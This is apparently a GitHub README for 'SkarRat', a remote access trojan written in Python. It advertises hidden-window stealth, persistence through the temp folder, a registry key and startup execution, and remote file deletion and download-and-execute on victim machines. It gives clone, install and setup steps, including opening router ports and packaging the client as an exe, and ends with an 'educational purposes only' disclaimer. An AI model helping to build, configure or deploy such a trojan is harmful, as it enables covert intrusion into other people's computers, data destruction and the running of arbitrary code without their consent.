# SkarRat
A Remote Administrative Trojan Made In Python

 ## Features !
 ### Client Side:
- Host server and port
- Hidden window and hidden process
- Installation in temp folder for persistance
- Adds registry key for persistance
- Runs on startup
- Customizable name

### Server Side:
- **Enter listening port**
- **Notivication on client connection**
- **Inbuilt commands** -> 'skar help' for commands
- **Navigate directorys on client**
- **Delte files on client**
- **Download and execute files**
- **Uninstall client**

  # Installtion:
  Instructions on how to install *SkarRat*
```bash
git clone https://github.com/SkarSys/SkarRat
cd SkarRat
pip install -r requirements.txt
```

# Usage:
## Setting up the server:
- Run the server.py
- When asked to enter a port, you must enter a port that is open, you may need to configure it on your wifi router site.
- Go to [canyouseeme](https://canyouseeme.org/) to cheak if the port is open
- Next it will automatically start listening for a client connection.

## Setting up the client:
- Open the client.py with any IDE
- Edit the veriables on the top (line 16)
- Save
- Convert to exe using pyinstaller (Optional)

# Conditions:
- This is a POC and is meant for educational perpuse only! I am not liable for any damage caused by SkarRat and will not be held accountable.
